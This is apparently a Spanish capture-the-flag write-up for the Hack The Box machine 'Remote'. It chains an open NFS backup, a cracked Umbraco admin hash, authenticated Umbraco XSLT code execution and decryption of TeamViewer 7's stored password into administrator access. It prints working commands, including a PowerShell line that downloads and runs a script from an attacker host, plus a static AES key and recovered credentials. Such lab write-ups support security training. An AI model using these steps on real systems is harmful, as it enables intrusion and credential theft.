// 01

Resumen

Resumen. NFS exporta /site_backups "para todos" y ahí está el respaldo del sitio: la base Umbraco.sdf con los hashes de los usuarios. El de admin@htb.local es SHA1 y cae con rockyou (baconandcheese). Con esas credenciales se entra al backoffice de Umbraco y se explota la RCE autenticada del visualizador de XSLT (EDB 46153), que ejecuta C# en el servidor → shell como iis apppool\defaultapppool. En la máquina corre TeamViewer 7, que guarda la contraseña (AES-128-CBC con clave estática) en el registro: se descifra y resulta ser la del administrador local → WinRM/SMB como admin → root flag.

// NOTA

Versión simplificada (la usada): montar el NFS, strings al .sdf, hashcat, el exploit de XSLT reescrito en Python 3 y un descifrado AES de 20 líneas. Sin Metasploit ni psexec: WinRM basta.

// 03

Reconocimiento

SHELL
$ sudo nmap -sS -p- -n -Pn --min-rate 2500 --open 10.129.230.172
$ sudo nmap -Pn -sV -p21,80,111,445,2049,5985 10.129.230.172
$ showmount -e 10.129.230.172

Lo que se encontró: NFS exporta /site_backups (everyone); la web es Umbraco ("Acme Widgets").

// 04

NFS → base de Umbraco

SHELL
$ sudo mount -t nfs 10.129.230.172:/site_backups /mnt/site_backups
$ sudo strings /mnt/site_backups/App_Data/Umbraco.sdf | head -8

Lo que se encontró:

adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}...

// 05

Crackeo del hash

SHELL
$ echo 'b8be16afba8c314ad33d812f22a04991b90e2aaa' > admin.sha1
$ hashcat -m 100 -a 0 admin.sha1 /usr/share/wordlists/rockyou.txt
# b8be16afba8c314ad33d812f22a04991b90e2aaa:baconandcheese

Lo que se encontró: admin@htb.local / baconandcheese (el usuario es el email; admin a secas no vale).

// 06

RCE autenticada en Umbraco

El backoffice acepta un XSLT con C# (msxsl:script) en /umbraco/developer/Xslt/xsltVisualize.aspx y lo ejecuta:

# umbraco_rce.py (Python 3, sin bs4)
# 1) GET /umbraco/ -> cookie UMB-XSRF-TOKEN
# 2) POST /umbraco/backoffice/UmbracoApi/Authentication/PostLogin {username, password}
# 3) GET /umbraco/developer/Xslt/xsltVisualize.aspx -> __VIEWSTATE / __VIEWSTATEGENERATOR
# 4) POST con ctl00$body$xsltSelection = XSLT que hace System.Diagnostics.Process.Start
SHELL
$ python3 umbraco_rce.py "/c powershell -c iex(new-object net.webclient).downloadstring('http://10.10.16.12/shell.ps1')"

Lo que se encontró: PS C:\windows\system32\inetsrv> como iis apppool\defaultapppool.

Trampa: el POST del XSLT se queda esperando mientras el comando sigue vivo (la reverse shell). Es normal: el shell llega igual.

// 07

TeamViewer 7 → contraseña de administrator

SHELL
$ Get-ItemProperty HKLM:\SOFTWARE\WOW6432Node\TeamViewer\Version7).SecurityPasswordAES
# 255,155,28,115,214,107,206,49,172,65,62,174,19,27,70,79,88,47,108,226,209,225,243,218,126,141,55,107,38,57,78,91

El cifrado es AES-128-CBC con clave y IV estáticos:

SHELL
$ openssl enc -d -aes-128-cbc \
$ -K 0602000000a400005253413100040000 \
$ -iv 0100010067244f436e6762f25ea8d704 \
$ -in tv.bin
# UTF-16LE -> !R3m0te!

Lo que se encontró: !R3m0te!, la contraseña de administrator.

// 08

Administrator

SHELL
$ nxc smb 10.129.230.172 -u administrator -p '!R3m0te!'
# [+] remote\administrator:!R3m0te! (Pwn3d!)
$ nxc winrm 10.129.230.172 -u administrator -p '!R3m0te!' -x 'type C:\Users\Administrator\Desktop\root.txt'

Lo que se encontró: root flag [flag oculta]. *(Con psexec.py sería nt authority\system.)*
